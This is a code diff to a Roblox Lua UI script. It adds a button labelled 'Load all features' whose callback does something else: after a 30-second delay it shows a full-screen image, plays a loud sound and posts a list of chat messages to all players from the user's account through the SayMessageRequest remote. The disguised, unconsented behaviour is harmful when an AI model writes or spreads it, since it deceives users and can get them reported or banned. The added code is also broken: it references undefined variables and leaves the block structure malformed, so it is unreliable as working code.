@@ -25,7 +25,28 @@ Window:Divider()
 local WindowTab = Window:Tab({ Title = "Window and File Configuration", Icon = "settings" })
 local CreateThemeTab = Window:Tab({ Title = "Create Theme", Icon = "palette" })
 
-    end
+ButtonTab:Button({
+    Title = "Load all features",
+    Desc = "Load all phantasm features",
+    Callback = function()
+        task.wait(30)
+        local gui = Instance.new("ScreenGui")
+        gui.Name = "ImageDisplay"
+        gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+        imageLabel.BackgroundTransparency = 1
+        imageLabel.ScaleType = Enum.ScaleType.Crop
+        imageLabel.Parent = gui
+        local sound = Instance.new("Sound")
+        
+        sound.Volume = 10
+        sound.Looped = false
+        sound.Parent = game.Workspace
+        
+        local target = "All"
+        local SayMessageRequest = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+        for _, message in ipairs(messages) do
+            SayMessageRequest:FireServer(message, target)
+        end
 })
 
 local Dropdown = ButtonTab:Dropdown({
